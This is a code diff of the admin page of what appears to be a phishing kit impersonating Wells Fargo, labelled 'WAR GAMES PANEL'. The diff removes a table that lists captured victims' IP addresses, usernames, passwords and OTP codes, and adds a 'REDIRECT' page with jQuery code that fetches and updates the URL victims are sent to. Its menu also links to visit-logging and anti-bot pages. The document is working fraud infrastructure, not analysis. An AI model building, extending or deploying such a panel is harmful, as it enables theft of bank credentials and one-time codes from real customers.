@@ -12,6 +12,7 @@ else{
 
 ?>
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,6 +22,7 @@ else{
   <link rel="icon" type="image/png" href="../assets/img/favicon.png">
   <title>
   ADMIN PANEL WELLSFARGO
+
   </title>
   <!--     Fonts and icons     -->
   <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700" />
@@ -36,7 +38,7 @@ else{
   <!-- Nepcha Analytics (nepcha.com) -->
   <!-- Nepcha is a easy-to-use web analytics. No cookies and fully compliant with GDPR, CCPA and PECR. -->
   <script defer data-site="YOUR_DOMAIN_HERE" src="https://api.nepcha.com/js/nepcha-analytics.js"></script>
-  <link id="pagestyle" href="../assets/css/style.css" rel="stylesheet" />
+  <link id="pagestyle" href="../assets/css/style.css?=dqwddwdqwdwqqwdwqd" rel="stylesheet" />
   <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
 
 </head>
@@ -48,6 +50,8 @@ else{
       <i class="fas fa-times p-3 cursor-pointer text-white opacity-5 position-absolute end-0 top-0 d-none d-xl-none" aria-hidden="true" id="iconSidenav"></i>
       <a class="navbar-brand m-0" href=" https://demos.creative-tim.com/material-dashboard/pages/dashboard " target="_blank">
         <span class="ms-1 font-weight-bold text-white">WAR GAMES PANEL</span>
+
+
       </a>
     </div>
     <hr class="horizontal light mt-0 mb-2">
@@ -62,7 +66,7 @@ else{
           </a>
         </li>
         <li class="nav-item">
-          <a class="nav-link text-white" href="../pages/login_visit.php">
+          <a class="nav-link text-white " href="../pages/login_visit.php">
             <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
               <i class="material-icons opacity-10">table_view</i>
             </div>
@@ -78,7 +82,7 @@ else{
           </a>
         </li>
         <li class="nav-item">
-          <a class="nav-link text-white  active bg-gradient-dark  " href="../pages/anti-bot.php">
+          <a class="nav-link text-white " href="../pages/anti-bot.php">
             <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
               <i class="material-icons opacity-10">table_view</i>
             </div>
@@ -86,7 +90,7 @@ else{
           </a>
         </li>
         <li class="nav-item">
-          <a class="nav-link text-white " href="../pages/update_url.php">
+          <a class="nav-link text-white active bg-gradient-dark " href="../pages/update_url.php">
             <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
               <i class="material-icons opacity-10">table_view</i>
             </div>
@@ -114,9 +118,9 @@ else{
         <nav aria-label="breadcrumb">
           <ol class="breadcrumb bg-transparent mb-0 pb-0 pt-1 px-0 me-sm-6 me-5">
             <li class="breadcrumb-item text-sm"><a class="opacity-5 text-dark" href="javascript:;">APP</a></li>
-            <li class="breadcrumb-item text-sm text-dark active" aria-current="page">Antibot</li>
+            <li class="breadcrumb-item text-sm text-dark active" aria-current="page">REDIRECT</li>
           </ol>
-          <h6 class="font-weight-bolder mb-0">Antibot</h6>
+          <h6 class="font-weight-bolder mb-0">REDIRECT</h6>
         </nav>
         <div class="collapse navbar-collapse mt-sm-0 mt-2 me-md-0 me-sm-4" id="navbar">
           <div class="ms-md-auto pe-md-3 d-flex align-items-center">
@@ -139,35 +143,40 @@ else{
         <div class="col-12">
           <div class="card my-4">
             <div class="card-header p-0 position-relative mt-n4 mx-3 z-index-2">
-              <div class="bg-gradient-dark shadow--dark border-radius-lg pt-4 pb-3">
-                <h6 class="text-white text-capitalize ps-3">Authors table</h6>
+              <div class="bg-gradient-dark shadow-dark border-radius-lg pt-4 pb-3">
+                <h6 class="text-white text-capitalize ps-3" id="totalss"></h6>
               </div>
             </div>
             
             <div class="card-body px-0 pb-2" style="
-                    height: 60vh;
+                    height: auto;
                     scroll-behavior: auto;
                     overflow: scroll;
                 ">
-              <div class="table-responsive p-0">
-                <table class="table align-items-center mb-0">
-                  <thead>
-                  <tr>
-                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">#ID</th>
-                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">IP</th>
-                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7 ps-2">USERNAME</th>
-                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">PASSWORD</th>
-                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">OTP</th>
-                    </tr>
-                  </thead>
-                  <tbody id="tbodix">
-                  
-                  </tbody>
-                </table>
-                <div class="loading" style="display: none;">
-                  <div class="lds-ripple"><div></div><div></div></div>
-                </div>
+              <h1 style="font-size: 16px;padding-left:20px">Curent url:</h1>
+             <div class="labels">
+                  <div class="texts badge-colors my-2 text-start">
+                    <div class="text1">
+                    <!-- <i class='bx bx-globe'></i> -->
+                    <input type="text" placeholder="https://....." disabled name="curent_url" class="urls wid-500" id="curent_url">
+                   <a href="" target="_blank"  id="url_curent_acces">
+                   <input type="button" value="ACCES URL" class="btns bg-gradient-dark">
+                   </a> 
+                    </div>
+                  </div>
               </div>
+              <hr class="hrs">
+              <h1 style="font-size: 16px;padding-left:20px">Update url:</h1>
+             <div class="labels">
+                  <div class="texts badge-colors my-2 text-start">
+                    <div class="text1">
+                    <!-- <i class='bx bx-globe'></i> -->
+                    <input type="text" placeholder="https://" name="url" class="urls wid-500" id="update_u">
+                    <input type="button" value="UPDATE" class="btns bg-gradient-dark" id="update_url">
+                  </div>
+              </div>
+
+              
             </div>
           </div>
         </div>
@@ -199,7 +208,7 @@ else{
         </div>
         <a href="javascript:void(0)" class="switch-trigger background-color">
           <div class="badge-colors my-2 text-start">
-            <span class="badge filter bg-gradient-dark active" data-color="primary" onclick="sidebarColor(this)"></span>
+            <span class="badge filter bg-gradient-dark active" data-color="dark" onclick="sidebarColor(this)"></span>
             <span class="badge filter bg-gradient-dark" data-color="dark" onclick="sidebarColor(this)"></span>
             <span class="badge filter bg-gradient-info" data-color="info" onclick="sidebarColor(this)"></span>
             <span class="badge filter bg-gradient-success" data-color="success" onclick="sidebarColor(this)"></span>
@@ -275,8 +284,123 @@ else{
 
 <script>
 
+
+
+
+ 
+
+
+
+
+
+
+// var source = "../dirty-siren-40635.mp3"
+//             var audio = document.createElement("audio");
+//             //
+//             audio.autoplay = true;
+//             //
+//             audio.load()
+//             audio.src = source;
+
+
+
+
+
   $('.loading').show()
-  
+  let old_data = []; 
+  function fetchData() {
+    
+    $.ajax({
+      url : '../php-api/check_url_redirect.php',
+      type : 'GET',
+      dataType: 'json',
+      success : function (result) {
+        // $('#visitor_total').text( `${result.length} TOTAL` )
+        if(result){
+            console.log(result[0])
+            $('#curent_url').attr("placeholder", result[0]);
+            $('#url_curent_acces').attr("href", result[0]);
+        }
+      },
+      error : function () {
+          console.log ('errordwdwd');
+      }
+    });
+    }
+    function compare_data(old_data, new_Data) {
+    return JSON.stringify(old_data) === JSON.stringify(new_Data);
+  }
+
+
+
+fetchData()
+setInterval(fetchData, 3000);
+
+
+
+  $('#update_url').click(function () {
+      var url_up = $('#update_u').val();
+
+      var elm;
+      function isValidURL(u){
+        if(!elm){
+          elm = document.createElement('input');
+          elm.setAttribute('type', 'url');
+        }
+        elm.value = u;
+        return elm.validity.valid;
+      }
+      if(isValidURL(url_up)){
+        $.ajax({
+            type: 'POST',
+            url: '../php-api/post_check_url_redirect.php',
+            data: {
+              urls: url_up,
+            },
+            dataType: 'json',
+            success: function (response) {
+                // Verifică dacă editarea a fost cu succes
+                if (response.success) {
+                  $('#totalss').html('Succes.')
+                  fetchData()
+                  setTimeout(() => {
+                    $('#totalss').html('')
+                }, 2000);
+                } else {
+                    console.error();
+                $('#totalss').html('UPDATE ERROR: ' + response.error)
+                setTimeout(() => {
+              $('#totalss').html('')
+            
+          }, 2000);
+
+                }
+            },
+            error: function () {
+                console.error('');
+                $('#totalss').html('SERVER ERROR')
+                setTimeout(() => {
+              $('#totalss').html('')
+            
+          }, 2000);
+            }
+        });
+        }else{
+          console.log('no')
+          $('#totalss').html('Please insert valid url')
+          setTimeout(() => {
+              $('#totalss').html('')
+            
+          }, 2000);
+        }
+
+
+      
+  });
+
+
+
+
 </script>
 
 </html>
